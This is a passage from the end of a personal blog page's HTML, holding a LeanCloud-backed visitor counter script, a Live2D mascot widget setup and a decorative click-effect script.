            $(element).find(COUNT_CONTAINER_REF).text(time);
          }
          for(var i = 0; i < entries.length; i++) {
            var url = entries[i];
            var element = document.getElementById(url);
            var countSpan = $(element).find(COUNT_CONTAINER_REF);
            if( countSpan.text() == '') {
              countSpan.text(0);
            }
          }
        })
        .fail(function (object, error) {
          console.log("Error: " + error.code + " " + error.message);
        });
    }

    function addCount(Counter) {
      var $visitors = $(".leancloud_visitors");
      var url = $visitors.attr('id').trim();
      var title = $visitors.attr('data-flag-title').trim();
      var query = new AV.Query(Counter);

      query.equalTo("url", url);
      query.find({
        success: function(results) {
          if (results.length > 0) {
            var counter = results[0];
            counter.fetchWhenSave(true);
            counter.increment("time");
            counter.save(null, {
              success: function(counter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(counter.get('time'));
              },
              error: function(counter, error) {
                console.log('Failed to save Visitor num, with error message: ' + error.message);
              }
            });
          } else {
            var newcounter = new Counter();
            /* Set ACL */
            var acl = new AV.ACL();
            acl.setPublicReadAccess(true);
            acl.setPublicWriteAccess(true);
            newcounter.setACL(acl);
            /* End Set ACL */
            newcounter.set("title", title);
            newcounter.set("url", url);
            newcounter.set("time", 1);
            newcounter.save(null, {
              success: function(newcounter) {
                var $element = $(document.getElementById(url));
                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
              },
              error: function(newcounter, error) {
                console.log('Failed to create');
              }
            });
          }
        },
        error: function(error) {
          console.log('Error:' + error.code + " " + error.message);
        }
      });
    }

    $(function() {
      var Counter = AV.Object.extend("Counter");
      if ($('.leancloud_visitors').length == 1) {
        addCount(Counter);
      } else if ($('.post-title-link').length > 1) {
        showTime(Counter);
      }
    });
  </script>



  

  

  
  

  

  

  

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/Epsilon2.1.model.json"},"display":{"position":"right","width":300,"height":400},"mobile":{"show":true},"log":false});</script></body>
</html>


<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/src/love.js"></script>

